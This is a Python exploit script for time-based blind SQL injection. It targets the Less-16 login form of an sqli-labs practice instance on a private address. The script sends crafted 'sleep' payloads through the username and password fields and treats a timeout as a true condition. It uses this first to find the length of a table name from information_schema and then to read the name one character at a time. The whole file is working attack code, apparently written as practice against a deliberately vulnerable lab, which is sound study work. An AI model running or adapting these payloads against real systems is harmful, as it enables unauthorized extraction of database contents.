import sys
import requests
import urllib3
from urllib.parse import quote

#dork_listy = []
def send_req(Inputs,number,ascii):
        try:
            r = requests.post("http://192.168.2.26/sqli-labs-master/Less-16/", data={'uname': Inputs, 'passwd': Inputs}, timeout=4)
        except:
            # print (Inputs)
            if ascii:
                print(" ")
            else:
                print(str(number))
            return Inputs

for i in range(10):
    length = quote('" and if(length((select table_name from information_schema.tables limit 1,1))='+str(i)+',sleep(5),1)--+')
    #print (length)
    range_value = send_req(length,i,False)
    if(range_value):
        break

range_value =int(i)+1
print("Range Value:",range_value)
for y in range(1,range_value):

    for loop in range(65,123):
        sys.stdout.write("\r"+str(chr(loop)))
        sys.stdout.flush()
        Inputs = quote('" and if(ascii(substring((select table_name from information_schema.tables limit 1,1),'+str(y)+',1))='+str(loop)+',sleep(5),1)--+', safe='')
        #print(Inputs)
        send_req(Inputs,loop,True)